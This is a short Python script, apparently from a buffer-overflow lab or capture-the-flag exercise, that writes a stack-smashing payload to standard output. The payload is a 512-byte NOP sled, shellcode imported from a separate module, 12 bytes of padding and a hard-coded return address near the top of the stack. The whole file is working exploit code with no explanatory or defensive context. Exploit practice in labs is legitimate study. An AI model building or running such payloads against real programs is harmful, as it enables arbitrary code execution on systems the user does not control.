import sys
from shellcode import shellcode
	
addr = 0xfff6b784.to_bytes(4, "little")#start of stack or near
sys.stdout.buffer.write(b"\x90"*512+ shellcode + b"A" * 12 + addr)
